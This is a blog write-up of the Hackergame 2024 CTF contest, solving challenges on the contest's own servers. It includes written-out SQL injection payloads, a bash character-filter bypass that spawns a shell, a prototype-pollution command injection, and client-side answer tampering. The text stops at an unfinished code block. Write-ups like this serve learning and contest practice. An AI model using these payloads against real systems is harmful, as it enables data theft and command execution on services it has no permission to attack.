---
title: 🚩 Hackergame 2024 解题报告
date: 2024-11-06 09:03:45
tags:
- CTF
cover: https://imgsrc.chyk.ink/JuqgZ7ibm42Jm1hc.webp
mathjax: true
---

又是一年 Hackergame 的季节，于是我就又来玩啦。

<!--more-->

最后得分 4900，排名 60/2460，校内排名 3/126。

有些题（比如区块链、RISC-V）完全没有思路，这里就不写啦。

### 🚩 ✅ 签到题

题目要求在 60 秒内输入 12 种不同语言的「启动」，同时还会播放一首非常上头的[主题歌](https://file.chyk.ink/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/ctf/hg2024/Hackergame.mp3)，neta 了之前非常火的「沙威玛传奇」。

{%ablock%}

Hackergame～🚩🎶 哦 Hackergame～🚩🎶 哦 Hackergame🚩🎶
有了你 😙❤️🚩，生活美好 😍🙏💐，没烦恼 🤷🤤🎼
Hackergame 传奇 🌊🚩🧜‍♂️，奇妙至极 ✨🧞‍♂️
最棒比赛 🤩👾🎮，人人赞叹你 👍👍👍
如果卡关 😖😭，那可不对 🙅⭕️😝
今晚没拿flag 🚩😨❓，我就会吼叫 😱😱🙉
无论白天 ☀️🤤🚩，还是黑夜 🌙😪💤
Hackergame 的挑战让头脑清醒 🤯🤯

{%endablock%}

套路和之前一样还是改 url 参数，如果什么都不输直接启动，url 参数为 `?pass=false`，改为 `true` 即可拿到 flag。{%icon https://imgsrc.chyk.ink/suzume_bili_kfc.webp %}

{%image https://imgsrc.chyk.ink/Zqa9Ur3RtKU_GWPO.webp 启动！ %}

### 👊 ✅ 喜欢做签到的 CTFer 你们好呀

这次居然有两道签到题 ...

{%image https://imgsrc.chyk.ink/G_Mj4qC4SRhGO4x7.webp %}

「有两个 flag 就藏在中国科学技术大学校内 CTF 战队的招新主页里」，于是打开[主页](https://www.nebuu.la/)。
这个主页采用 [LiveTerm](https://github.com/Cveinnt/LiveTerm) 模板制作，之前一个群友的主页就是用它做的。

首先输入 `help` 简单看看有什么命令 ...

```
Welcome! Here are all the available commands:

=========== Available Commands ===============

about awards banner bing cat cd echo
email env github help ls members nvim
readme repo sudo sumfetch vi whoami 

==============================================
```

输入 `sudo` 会直接播放[奶龙](https://www.bilibili.com/bangumi/play/ss40551) ... 可还行 ...

输入 `env`，会发现第一个 flag 藏在环境变量 `$FLAG` 里。~~居然是 NixOS 爱好者~~

```
ctfer@ustc-nebula:$ ~ env
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOS❄️
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

输入 `ls -a` 会发现隐藏的文件 `.flag`，`cat` {%icon https://imgsrc.chyk.ink/suzume_bili_agadcwsaamrcsvq.webp %} 即可。

```
ctfer@ustc-nebula:$ ~ cat .flag
flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}
```

### 🐱 ✅ 猫咪问答（Hackergame 十周年纪念版）

> 多年回答猫咪问答的猫咪大多目光锐利，极度自信，且智力逐年增加，最后完全变成猫咪问答高手。回答猫咪问答会优化身体结构，突破各种猫咪极限。猫咪一旦开始回答猫咪问答，就说明这只猫咪的智慧品行样貌通通都是上等，这辈子注定在猫咪界大有作为。

欸？真的会变聪明嘛？{%icon https://imgsrc.chyk.ink/suzumi_bili_2_butterfly_attracted.webp %}

1. **在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？**

   搜索到 [contest [SEC@USTC]](https://lug.ustc.edu.cn/wiki/sec/contest.html) 的存档页面，得到答案 `3A204`

1. **众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？**

   翻阅往届 Hackergame 题目数量：
   2019 - 28；2020 - 31；2021 - 31；2022 - 33；2023 - 29

   于是在 [Hackergame 2019](https://news.ustclug.org/2019/12/hackergame-2019/) 相关新闻网页得到答案 `2682`。

1. **Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？**

   搜索 `Hackergame 2018 图书馆`，在 [2018 年 writeup](https://github.com/ustclug/hackergame2018-writeups/blob/master/official/ustcquiz/README.md) 中获得答案 `程序员的自我修养`。

1. **在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？**

   搜索 `USENIX  email spoofing University of Science and Technology of China`，得到 [论文](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)。
   在第 9 页（页码 1250）发现 `resulting in 336 combinations`，得到答案 `336`。

1. **10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？**

   紧跟时事。搜索得到 [commit](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2) id 前六位为 `6e90b6`。

   这道题出得有点疑惑，一开始我找的是 Linus *合并* Greg 的修改的 commit，结果发现不对，之后试了一下原 commit，竟然对了。

1. **大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？**

   我第一反应是去 [Hugging Face](https://huggingface.co/meta-llama/Meta-Llama-3-70B) 下载，但申请了之后莫名其妙被拒绝了。
   {%image https://imgsrc.chyk.ink/cLf2q8xHGarv7Ilz.webp%}

   在[讨论区](https://huggingface.co/meta-llama/Meta-Llama-3-8B/discussions/82)中发现解决方法：去 [Llama 官网](https://www.llama.com/llama-downloads/) 下载模型。

   下载 `/70b_pre_trained/tokenizer.model`，查阅[文档](https://pytorch.org/torchtune/0.2/generated/torchtune.models.llama3.Llama3Tokenizer.html)发现使用方法。在 F12 的网络标签中拿到原始 html，丢进去即可得到答案 `1833`。

   ```python
   from torchtune.models.llama3 import Llama3Tokenizer
   tokenizer = Llama3Tokenizer("/home/chiyuki/hackergame/llama/tokenizer.model")
   tokenized_text = tokenizer.encode(open('questions.html', 'r').read(), add_bos=False, add_eos=False)
   print(tokenized_text.__len__())
   ```

   {%ablock color:cyan%}
   
   吐槽一下：这个模型以前叫作 *LLaMA*，大小写~~和 LaTeX 一样~~迷惑，现在总算变成 Llama 了。
   
   {%endablock%}

### 📦 ✅ 打不开的盒

我超，盒。

题目是一个 STL 文件，flag 被写在了盒子内部。正解应该是用 FreeCAD 之类的 CAD 软件删掉盒盖，不过我直接找了个[在线 3D STL 查看器](https://imagetostl.com/cn/view-stl-online#convert) 然后穿模卡进模型内部看到了 flag ... {%icon https://imgsrc.chyk.ink/suzume_bili_milktea.webp %}

{%image https://imgsrc.chyk.ink/Z5kvvMtV5petCgxK.webp %}

### 👀 ✅ 每日论文太多了！

题目是一篇[论文](https://dl.acm.org/doi/10.1145/3650212.3652145)，点开之后 Ctrl+F 搜索 flag，一块白色的区域亮了起来。

使用任意一个 pdf 编辑工具打开论文（我用的是 LibreOffice），发现只是糊了一个白色的图片上去，删掉即可看到 flag。

{%image https://imgsrc.chyk.ink/V2PQk5bTpW5fGmWP.webp %}

没想到他们真的把 flag 写进 ACM 论文里了 ... **出题人太拼命了**！{%icon https://imgsrc.chyk.ink/suzume_bili_chuang.webp %}

### 😡 ✅ 比大小王

今年做过的第二道用小猿口算出的题，[上次](/2024/10/22/nex-2024-experience-and-writeups/#🙉-✅-世界计算能力下降一万倍)是加减法，这次是比大小。

观察代码不难看出，存在一个**全局**变量 `state`：

```javascript
let state = {
  allowInput: false,
  score1: 0,
  score2: 0,
  values: null,
  startTime: null,
  value1: null,
  value2: null,
  inputs: [],
  stopUpdate: false,
};
```

一开始游戏请求 `/game` 拿到题目存入 `state.values` 中，而比大小的结果存在 `state.inputs`，当玩家全部答完时，游戏会把 `state.inputs` 发到 `/submit` ，交给后端判题。

F12 对症下药即可拿到 flag。

```javascript
fetch("/submit", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    inputs: state.values.map(([l, r]) => (l < r ? "<" : ">")),
  }),
})
  .then((response) => response.json())
  .then((data) => {
    state.stopUpdate = true
    document.getElementById("dialog").textContent = data.message
    document.getElementById("dialog").style.display = "flex"
  })
```

{%image https://imgsrc.chyk.ink/4LKW5jav1w3UcqDX.webp %}

题目最大的可利用点在于 `states` 是**全局**变量，所以可以用自己的脚本直接操作。其实，即使它用闭包，不是全局变量，在 F12 里也有方法可以拿下，不过这就是后话了。

### 🖼️ ✅ 旅行照片 4.0

> 你们的生活到底真的假的呀？每天要么就是看漫展看偶像看 live 喝酒吃烧烤，要么就是这里那里旅游。阵容一宣，说冲就冲，群一拉，机票一买，钱就像大风刮来的，时间好像一直有。c\*\*4 你们也去，mu\*\*ca 你们也去，m\*\*o 你们也去，to\*ea\*i 你们也去。我怎么一天到晚都在上班啊，你们那到底是怎么弄的呀？教教我行不行

呜呜呜 教教我行不行？{%icon https://imgsrc.chyk.ink/suzume_bili_agadcwsaamrcsvq.webp %}

{%image https://imgsrc.chyk.ink/DpqoX-h64Wqzm2a9.webp 第一张照片 %}

- 照片拍摄的位置距离中科大的哪个校门更近？

  高德地图搜索「科里科气科创驿站」即可得到答案 `南校区西门`。不是科大在校猫咪也可以得到答案。

- 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？

  既然是 ACG，那么就去 B 站搜索「中科大 ACG 音乐会」。搜索到的[视频](https://www.bilibili.com/video/BV1mr421w74g/)简介中写着答案 `20240519`。

{%image https://imgsrc.chyk.ink/Hcy2jsj4vmpKDnmf.webp 第二张照片 %}

{%image https://imgsrc.chyk.ink/x5HvwaGMtnM2Hsf5.webp 第三张照片 %}

- 这个公园的名称是什么？

  把第二张照片丢进百度识图得到一篇点不开的文章「彩虹跑道、灯光喷泉！城区这两座公园升级啦」，然而这种文章不可能只在一个平台发， 于是把文章名丢到搜索引擎即可找到[能用的链接](https://www.sohu.com/a/499217031_121117453)，得到答案 `中央公园`。

- 这个景观所在的景点的名字是？

  把第三张照片丢进百度识图，根据喷泉有棱有角的特征，可以在结果中找到一篇三峡旅游[博文](https://www.meipian.cn/233y0fil)，其中提到景点名为 `坛子岭`。

{%image  https://imgsrc.chyk.ink/ubZwkIQ4vulHpe9G.webp 第四张照片 %}

> 糟了，三番五次调查学长被他发现了？不过，这个照片确实有趣，似乎有辆很标志性的……四编组动车？

- 左下角的动车组型号是？

  题目中提到了「四编组动车」，并且从配色来看是复兴号，于是搜索「复兴号 四编组动车」，得知其型号为 [`CRH6F-A`](https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html)。

- 距离拍摄地最近的医院是？
  
   文章中有提到这辆车都在哪些铁路运营，并依次搜索，分辨外观，最终确定线路为「北京市郊铁路S5线」（北京市郊铁路怀柔—密云线）。
   
   {%image https://imgsrc.chyk.ink/ynVGaJ0eQP19qPkJ.webp 搜索结果%}
   
   根据搜索结果，这个路线依次经过北京北站、清河站、昌平北站、雁栖湖站、怀柔北站、黑山寺站、古北口站。
   
   依次尝试，最终定位到北京北站附近的 `积水潭医院`。

{%ablock color:cyan%}

在 GeekGame 之后，Hackergame 也出了和火车相关的题。

在我暑假的一次[去北京的旅行](/2024/08/27/2024-midpoint-review/#🤪-高考后的环游)中，曾经拍到过一辆颜色差不多的复兴号，照片看不清楚是不是这种车，但是感觉确实是很妙的巧合。{%icon https://imgsrc.chyk.ink/suzume3_ciallo.webp %}

{%endablock%}

### 🆖 ✅ 不宽的宽字符

题目涉及到一种错误的强制数据类型转换 `(char*)filename.c_str()`，需要在输入的字符串被附加 `L"you_cant_get_the_flag"` 如此错误处理的情况下，打开 `Z:\theflag`。

如果我输入 `Z:\theflag`，会被转换为 `wchar_t` 数组 `L"Z:\\theflag"`，之后被错误强制转换为 `char` 数组 `Z\x00:\x00\\\x00t\x00h\x00e\x00f\x00l\x00a\x00g\x00`，从而无法读取正确的文件。

<!--我尝试用特殊的 Unicode 字符，比如 UTF-16 编码和 `Z:` 的 ASCII 编码一样的 `㩚`，但在题目的英文环境下，它会直接变成 `?\x00`，于是就没有思路了。-->

于是我们可以来一个反向转换：使用一些特殊字符，使其被错误转换后的结果为 `Z:\theflag\x00`，以提前结束这个字符串。运行这行 Python 代码 `'Z:\\theflag\x00a'.encode().decode('utf16')`（a 只是为了凑字数），之后把得到的神秘字符 `㩚瑜敨汦条愀` 输入到题目中就可以拿到 flag。

### 🐚 ✅ PowerfulShell

题目是一个封禁了 `"'\";,.%^*?!@#%^&()><\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"` 字符的 bash，flag 位于 `/` 目录下。因为 `\` 字符被禁了，所以 [BashFuck](https://github.com/ProbiusOfficial/bashFuck) 这种用数字转义字母的方法不可行。{%icon https://imgsrc.chyk.ink/suzumi_bili_2_bighead.webp %}

但是，不难注意到 `:` 字符没被禁，所以可用用字符串切片的方式解出这题。

`~` 字符没被禁，输入一下 `~` 可以发现题目的家目录是 `/players`，运行 `__=~`，我就获得了第一个字符串变量。用 `${__:2:1}${__:7:1} ${__:0:1}` 就可以拼凑出 .... 欸？`0` 也被禁了。

经过简单尝试之后，发现用没被禁的中括号 `[]` 可以进行数学运算，所以用 `$[1-1]` 就可以凑出来一个 `0`。现在用 `${__:2:1}${__:7:1} ${__:$[1-1]:1}` 就可以拼凑出 `ls /`。运行之后发现 flag 位于 `/flag`。

现在还差两个字母 `f` 和 `g` 凑不出来，`cat` 中的 `c` 和 `t` 也凑不出来。

其实还有一种方法可以拿到更多字符——[shell options](https://medium.com/@linuxadminhacks/understanding-and-modifying-shell-options-in-linux-e02d462a15b8)。它储存在 `$-` 变量中，而 `-` 字符正好也没被禁。运行 `$-` 发现它的内容是 `hB`，于是我又多了 `h` 和 `B` 这两个字符。

而有了 `h` 可以做什么呢？用 `${__:7:1}${-:$[1-1]:1}` 可以凑出一个 `sh`，在打开的新 shell 里 `cat /flag` 就能得到 flag。

{%image https://imgsrc.chyk.ink/D7R8_zI5V5WPO842.webp %}

太 Powerful 了！{%icon https://imgsrc.chyk.ink/suzume3_ciallo.webp %}

### ♻️ ✅ Node.js is Web Scale

Node.js，Node.js，又是 Node.js。{%icon https://imgsrc.chyk.ink/suzume_bili_crazy.webp %}

题目是一个 Node.js express 服务器，有一个键值对 `store` 用于存储内容，可以设置值或是获取值，另有一个 `const cmds` 键值对存放了若干可以运行的 shell 命令，查看源码的功能就是在这里写了一个 `cat`。

但是稍微了解一点 js 就会知道 js 并没有明确的类和继承的概念，js 中的类是通过原型链实现的。`store` 和 `cmds` 都是 `Object`，通过 `store.__proto__` 和 `cmds.__proto__` 都可以访问到 `Object` 本身。

这里举一个例子：

```javascript
const cmds = {star: 'rail'}
let store = {}
store.__proto__.genshin = 'impact'
cmds.genshin
// 'impact'
```

这被称为「原型链污染攻击」。因此，在题目网页给 `store` 的 `__proto__.genshin` 赋值 `cat /flag`，`cmd` 的 `genshin` 属性就也一样变成了 `cat /flag`（即使它是 `const`）。这时候再运行 `genshin` 命令，flag 就暴露无遗了。

{%image https://imgsrc.chyk.ink/xUgRGIKe83qB_H-0.webp OMG it's leaking! %}

### 🎭 ✅ PaoluGPT

题目是一个包含 999 条聊天记录的网站，文案涉及各个领域和各种离谱问题，甚至有「为什么孙悟空是中国猴子却叫美猴王，不应该叫中猴王吗」之类的弱智吧语录。

flag 藏在聊天记录中。写个脚本依次点开所有聊天记录就可以拿下 flag 1。

{%folding child:codeblock 解题代码 %}
```javascript
;(() => {
  let urls = []
  const parser = new DOMParser()
  let result = ""
  document
    .querySelector(".container.pt-3>ul")
    .childNodes.forEach((n) => urls.push(n.childNodes[0]?.getAttribute("href")))
  urls = urls.filter((n) => n != undefined)
  urls.forEach(url=> {
    fetch(url).then(res=>res.text()).then(html=>{
      result = parser.parseFromString(html, 'text/html').querySelector('.container.pt-3:not(.px-3)').innerText
      if (result.includes('flag')) {
          console.log(result)
      }
    })
  })
})()
```
{%endfolding%}

这道题还有一个 flag。起初我以为 flag 2 被用某种编码加密了，藏在某个聊天记录中。于是我又跑了一遍脚本把所有聊天记录[下载了下来](https://file.chyk.ink/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/ctf/hg2024/%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95.txt)，花了快半个小时浏览了一下，看得眼睛都疼了，但就是没有发现神秘编码。{%icon https://imgsrc.chyk.ink/suzume_bili_qiyun.webp %}

后来又细读了一遍题目代码，发现有一段非常值得注意：

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

查询语句没做任何防护，所以可以进行 **SQL 注入**。{%icon https://imgsrc.chyk.ink/suzume_bili_thinking.webp %}

SQLite 的一个 `cursor` 中不能执行多行语句，只能用限制重重的 `union` 来解决。

先看看有什么表吧。

```
GET /view?conversation_id=' union select GROUP_CONCAT(tbl_name), GROUP_CONCAT(name) from sqlite_master union select title, contents from messages where id='
```

查询结果为

{%ablock%}

聊天记录：messages,messages

messages,sqlite_autoindex_messages_1

{%endablock%}

说明只有 messages 一个表。那么 ...

```
GET /view?conversation_id=' union select group_concat(name), group_concat(type) from pragma_table_info('messages') union select title, contents from messages where id ='
```

{%ablock%}

聊天记录：id,title,contents,shown

text,text,text,boolean

{%endablock%}

有一列 `shown`，于是直接

```
GET /view?conversation_id=' or shown=0 union select title, contents from messages where id ='
```

这个被隐藏的聊天记录中赫然写着第二个 flag。

### 🔟 ⭕ 强大的正则表达式

Math 三连跪。

> 终于在一个不眠夜，小 Q 一口气看完了正则表达式的教程。哈？原来这么简单？小 Q 并两分钟写完了自测题目，看着教程剩下的目录，「分组」、「贪婪」、「前瞻」，正则表达式也不过如此嘛，他心想，也就做一些邮箱匹配之类的简单任务罢了。
>
> 正当他还沉浸在「不过如此」的幻想中，他刷到了那个关于正则表达式的古老而又神秘的传说：
>
> 「正则表达式可以用来计算取模和 CRC 校验……」

阅读一下题目源码后发现需要用 `0123456789()|` 构造正则表达式以匹配指定的数。

flag 1 是需要匹配十进制形式的，可以被 16 整除的数。**不难看出** {%icon https://imgsrc.chyk.ink/suzume_bili_thinking.webp %}，10000（25x4x25x4）显然是 16 的倍数，于是列举出 16 的倍数的所有后四位即可通过。

```regexp
(0|1|2|3|4|5|6|7|8|9)*(
(00|04|08|12|16|20|24|28|32|36|40|44|48|52|56|60|64|68|72|76|80|84|88|92|96)(00|16|32|48|64|80|96)|
(01|05|09|13|17|21|25|29|33|37|41|45|49|53|57|61|65|69|73|77|81|85|89|93|97)(12|28|44|60|76|92)|
(02|06|10|14|18|22|26|30|34|38|42|46|50|54|58|62|66|70|74|78|82|86|90|94|98)(08|24|40|56|72|88)|
(03|07|11|15|19|23|27|31|35|39|43|47|51|55|59|63|67|71|75|79|83|87|91|95|99)(04|20|36|52|68|84)
)
```

这一长串我是手打的，结果官方题解只用了一行脚本就生成出来了 ... {%icon https://imgsrc.chyk.ink/suzume_bili_crazy.webp %}

flag 2 需要匹配二进制形式的，可以被 13 整除的数；flag 3 涉及到 CRC 计算，直接放弃。

倒是搜索到了 [Modular arithmetic with regular expressions](http://blog.sigfpe.com/2007/02/modular-arithmetic-with-regular.html) 这篇文章，不过根本看不懂 ... {%icon https://imgsrc.chyk.ink/suzume_bili_qiyun.webp %}

### 🆒 ⭕ 惜字如金 3.0

> 惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「`AEIOUaeiou`」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：
>
> - 第一原则（又称 creat 原则）：如单词最后一个字母为「`e`」或「`E`」，且该字母的上一个字母为辅音字母，则该字母予以删除。
> - 第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。

今年的「惜字如金」意想不到地难。

题目给出的是一个 CRC hash 计算 Python 脚本，每行原本都被用空格填充到了 81 个字符，但拿到的脚本有些行是 80，79 或 78 个，说明这些行里有被惜字如金化的词。

吸取了[上次](/2024/10/30/nex-2024-after-thinking/#🐘-Don’t-Touch-My-Code)的教训，这次我没有用 Kate，而是用了 gedit。

第一问[手动替换](https://file.chyk.ink/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/ctf/hg2024/xizi1.py)即可拿到 flag，而第二问竟然有一行只有 14 个字符。
有一个变量 `poly` 在第一问中为 `AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA`，而第二问中由 B 和 b 组成并被惜字如金化了。暴力穷举需要 2^47 次计算，以我电脑的算力要跑六百多天，需要 300 多元的电费，于是直接放弃。

{%ablock color:cyan 由 human 辅助惜字如金化 %}

This year's XZRJ question was unexpectedly dificult.

The question was a CRC hash calculation Python script. Each lin was originaly paded with spaces to 81 characters, but som lines of th script wer 80, 79 or 78 characters, indicating that there wer words that wer XZRJified in thes lines.

I learned from the leson [last time](/2024/10/30/nex-2024-after-thinking/#🐘-Don’t-Touch-My-Code), and this tim I didn't use Kat, but gedit.

In th first question, I got the flag by manualy replacing it, but in the second question, ther is a lin with only 14 characters.
Ther is a variabl `poly` which is `AaaaaaaaaaAAaaaaAAAAaaaAAAAaaaAAAAaaAAAAaaAAAAaAaAaAaAaA` in the first question, but in the second question, it is composed of B and b and is XZRJified. Brut forc enumeration requires 2^47 calculations, which would tak mor than 600 days to calculat on my computer, so I gav up.

{%endablock%}

下一年会不会出来个 umount 原则之类的 ...？{%icon https://imgsrc.chyk.ink/suzume_bili_question.webp %}

### 🔣 ⭕ 优雅的不等式

题目需要只使用**整数**和**加减乘除幂运算**构造一个简单函数 f(x)，使得这个函数在 \[0,1\] 区间上取值均大于等于 0，并且 f(x) 在 \[0,1\] 区间上的定积分（显然大于等于 0）刚好等于 π−p/q。

前两天一点思路都没有，直到第三天的高数课堂上 ...

{%image https://imgsrc.chyk.ink/1730899984809.webp %}

好家伙，这不就是我在找的东西吗！

结合课上讲的东西，用圆 x<sup>2</sup>+y<sup>2</sup>=1 摆弄了一会儿，发现实际需要的不是周长，而是面积（否则分母会为 0 而在 x=1 没有定义）。

于是结合题目给出的式子，用 `4*((1-x**2)**(1/2)-(1-x)**(1/2))` 拿下第一问。注意力惊人。

$$f(x) = 4 \left( \sqrt{1 - x^2} - \sqrt{1 - x} \right)$$

虽然还不知道「积分」是个什么，但起码对「积分是微分的逆运算」这件事有了点概念。高数，真神奇啊。

### 👀 ✅ 无法获得的秘密

> 小 A 有一台被重重限制的计算机，不仅没有联网，而且你只能通过 VNC 使用键鼠输入，看视频输出。上面有个秘密文件位于 `/secret`，你能帮他把文件**丝毫不差地**带出来吗？

题目开启了一个 Linux Xfce 4 远程桌面，环境中装有 Firefox 和 Python 3 这两个可以用来操作的软件。我的解决方法是把 `/secret` 转换为二进制，`0` 用黑色格子表示，`1` 用白色格子表示，用 OBS 录一段屏，`ffmpeg` 转换成图片，再识别即可。{%icon https://imgsrc.chyk.ink/suzumi_bili_2_push.webp %}

[录屏文件](https://file.chyk.ink/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/ctf/hg2024/hg2024secret.mp4)附上。

{%image https://imgsrc.chyk.ink/Rir_FJSL4RzWmMW3.webp %}

```python 远程桌面侧代码
import os
import time

secret = open('/secret', 'rb').read()
binstr = bin(int(secret.hex(), base=16)).replace('0', ' ').replace('1', '\u2588')

section = 0
for i in range(0, len(binstr), 6750):  # 150*45
    os.system('clear')
    section += 1
    print(f'section {section}')  # 方便后期校对
    page = binstr[i:i+6750]
    for j in range(0, len(page), 150):
        print(page[j:j+150])
    time.sleep(1)
```

{%folding child:codeblock 解码代码 %}

```python
# Generated by ChatGPT
from PIL import Image
import numpy as np
import os

bin_output = ''

# 定义函数来转换图片
def image_to_array(image_path):
    # 打开图片
    img = Image.open(image_path).convert('L')  # 转换为灰度模式
    width, height = img.size

    # 计算每个色块的宽度和高度
    block_width = width // 150
    block_height = height // 45

    # 初始化二维数组
    array = np.zeros((45, 150), dtype=int)

    # 遍历每个色块
    for row in range(45):
        for col in range(150):
            # 计算色块的中心点
            center_x = col * block_width + block_width // 2
            center_y = row * block_height + block_height // 2

            # 获取中心点的像素值
            pixel_value = img.getpixel((center_x, center_y))

            # 根据像素值判断黑白
            if pixel_value < 128:  # 黑色
                array[row][col] = 0
            else:  # 白色
                array[row][col] = 1

    return array

def list_files_in_directory(directory):
    global bin_output
    # 获取文件夹中所有文件名
    files = os.listdir(directory)
    # 过滤掉目录，只保留文件，并按字典序排序
    files = sorted([f for f in files if os.path.isfile(os.path.join(directory, f))])

    # 依次打印文件名并执行函数
    for filename in files:
        image_path = 'p2/' + filename  # 替换为你的图片路径
        # print(filename)  # 打印文件名
        try:
            result_array = image_to_array(image_path)
            for row in result_array:
                bin_output += (''.join(map(str, row)))
        except Exception as e:
            print(f"Error: {e}")

list_files_in_directory('p2')
secret=int(bin_output[:512*1024*8], base=2)
secret_length=512 * 1024
print(secret_length)
secret_file = secret.to_bytes(secret_length, byteorder='big')
with open('secret', 'wb') as f:
    f.write(secret_file)
```

{%endfolding%}

### 🗄️ ⭕ ZFS 文件恢复

由于之前用 Btrfs 用爆炸过一次，所以一直对这类很先进的 CoW 文件系统保持着某种抵触，一直在用 ext4 当作系统盘。和[去年](http://localhost:4000/2023/11/04/hackergame-2023/#%F0%9F%97%82%EF%B8%8F-%E2%AD%95-%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83)一样，MBRjun，不对，现在应该是 `zpool/MBR`，也早早就开始用 zfs 了，第一次听说 zfs 也是在他那里。{%icon https://imgsrc.chyk.ink/suzumi_bili_2_morning_eight.webp %}

{%image https://imgsrc.chyk.ink/99pdycHxmR7ux4yM.webp %}

> - 对于第一小题，你需要还原神秘消失的 `flag1.txt`。
> - 对于第二小题，你需要还原神秘消失的 `flag2.sh`，并根据该 shell 脚本的内容恢复出更多信息，然后运行该脚本获得本小题的 flag。

这道题需要从一个 zfs 镜像中恢复出误删除的文件。因为 zfs 是事务型文件系统，我第一反应是像用 git 恢复旧版本那样，回滚到删除文件之前的状态。但在用 `zdb` 查看历史记录后，发现根本没有删除文件的 transaction。在查看官方题解后，发现原来是文件还没删掉，还在即将删除的队列里 ...

在尝试回滚失败后，我便用十六进制编辑器打开镜像，然后搜索 `flag`，`flag1.txt` 由于被 gzip 压缩了，所以我并没有直接找到，但 `flag2.txt` 逃过一劫，我得以拷出原本的内容。

```bash
#!/bin/sh
flag_key="hg2024_$(stat -c %X.%Y flag1.txt)_$(stat -c %X.%Y "$0")_zfs”
echo "46c518b175651d440771836987a4e7404f84b20a43cc18993ffba7a37106f508  -" >sha256sum.txt
printf "%s" "$flag_key" | sha256sum --check sha256sum.txt || exit 1
printf "flag{snapshot_%s}\n" "$(printf "%s" "$flag_key" | sha1sum | head -c 32)"
```

很明显，做出第二问并不需要 `flag1.txt` 原本的内容，只需要知道 `flag1.txt` 的最后访问日期和修改日期就可以了。

我自己能力不足，没法用 `zdb` 完成整个过程。于是，抱着试试看的想法，申请了专有数据恢复软件 [Reclaime Pro](https://www.reclaime-pro.com/) 的十五天试用。结果 ...

{%image https://imgsrc.chyk.ink/mS5fov77BRZjAb_f.webp 瞳孔地震 %}

于是就这么拿到了 flag 2。{%icon https://imgsrc.chyk.ink/suzume_bili_burger.webp %}

```bash
#!/bin/sh
FLAG1_ACCESSED=$(date -d "2006-03-09 15:56:50 GMT" +%s)  # 1141919810
FLAG1_MODIFIED=$(date -d "1977-05-28 19:49:29 GMT" +%s)  # 233696969
FLAG2_ACCESSED=$(date -d "2036-11-09 20:49:03 GMT" +%s)
FLAG2_MODIFIED=$(date -d "2013-01-11 17:18:00 GMT" +%s)
flag_key="hg2024_${FLAG1_ACCESSED}.${FLAG1_MODIFIED}_${FLAG2_ACCESSED}.${FLAG2_MODIFIED}_zfs"
echo "46c518b175651d440771836987a4e7404f84b20a43cc18993ffba7a37106f508  -" >sha256sum.txt
printf "%s" "$flag_key" | sha256sum --check sha256sum.txt || exit 1
printf "flag{snapshot_%s}\n" "$(printf "%s" "$flag_key" | sha1sum | head -c 32)"
```

这两个数字绝对是故意写的 ...

### 🚌 ✅ 不太分布式的软总线

这道题的文案绝对是在内涵 2020 年发布的某个[套壳操作系统](https://mp.weixin.qq.com/s/AM3C5z1QulG0wEKBFCyH6g) ... 不过 2024 年随着原生鸿蒙的推出，当年画的大饼也在一步步变成现实。

题目起了一个 DBus 服务，第一问需要往 `cn.edu.ustc.lug.hack.FlagService.GetFlag1` 发送 `"Please give me flag1"`，直接用 `gdbus` 解决即可，此处不再赘述。

第二问需要往 `cn.edu.ustc.lug.hack.FlagService.GetFlag2` 发送一个 file descriptor，内容为 `"Please give me flag2\n"`。题目会检测这个文件是否真的存在于磁盘上，写一个真正的文件然后 open 显然是不行的。

正解是用 [`memfd`](https://man7.org/linux/man-pages/man2/memfd_create.2.html)。我并不是特别了解 Linux 的这些丰富特性，第一次听说 `memfd` 这个东西还是因为 Linux 5.18 删除 `ashmem` 导致[安卓模拟环境 Waydroid 挂掉](https://github.com/waydroid/waydroid/issues/406)，需要用这东西作为替代，于是就去顺手查了查，没想到今天才用上。 由于我上大学之后才开始学 C 语言，知识比较匮乏，因此用 GPT 解出。

{%folding child:codeblock 第二问解题代码 %}

```c
